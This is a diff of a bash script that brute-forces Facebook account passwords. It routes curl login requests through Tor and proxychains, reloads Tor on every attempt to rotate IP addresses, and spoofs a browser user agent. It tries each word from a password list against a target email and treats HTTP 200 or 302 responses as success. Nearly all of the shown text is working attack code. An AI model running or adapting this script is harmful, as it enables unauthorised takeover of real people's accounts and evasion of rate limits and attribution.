@@ -50,17 +50,14 @@ fi
 if [[ ${passlist:00:01} = "~" ]]; then
 	passlist=$HOME${passlist:1}
 fi
-setfile=$(echo $wordlist | sed 's/\// /g') && setfilearray=($setfile) && file=${setfilearray[-1]}
-setdirectory=$(echo $wordlist |  sed 's/.'$file'//') && directory=$setdirectory
-
-if [ ! -d $directory ]; then
-	echo -e "\terror: can't create file on this directory!\n"
+if [ ! -f $passlist ]; then
+	echo -e "\terror: wrong file location!\n"
 	exit 0
 fi
 echo ""
 rm -rf /tmp/fbrooter
 service tor start
-pc curl -L --data-urlencode email="" --data-urlencode pass="" --data-urlencode name="login" "https://www.facebook.com/login.php?login_attempt=1&lwv=110" --cookie-jar /tmp/fbrooter -A "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36" -s -o /dev/null
+proxychains curl -L --data-urlencode email="" --data-urlencode pass="" --data-urlencode name="login" "https://www.facebook.com/login.php?login_attempt=1&lwv=110" --cookie-jar /tmp/fbrooter -A "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36" -s -o /dev/null
 passlist=($(cat $wordlist))
 lastwordnumber=${#passlist[@]}
 numbword="0"
@@ -68,7 +65,7 @@ while [[ true ]]; do
 	service tor reload
 	currentword=${passlist[$numbword]}
 	error=false
-	response=$(echo $(pc curl --data-urlencode email="$email" --data-urlencode pass="$currentword" --data-urlencode name="login" "https://www.facebook.com/login.php?login_attempt=1&lwv=110" --cookie /tmp/fbrooter -A "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36" -w "%{http_code}" -s -o /dev/null))
+	response=$(echo $(proxychains curl --data-urlencode email="$email" --data-urlencode pass="$currentword" --data-urlencode name="login" "https://www.facebook.com/login.php?login_attempt=1&lwv=110" --cookie /tmp/fbrooter -A "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36" -w "%{http_code}" -s -o /dev/null))
 
 
 	if [[ $response == "200" ]] || [[ $response == "302" ]]; then
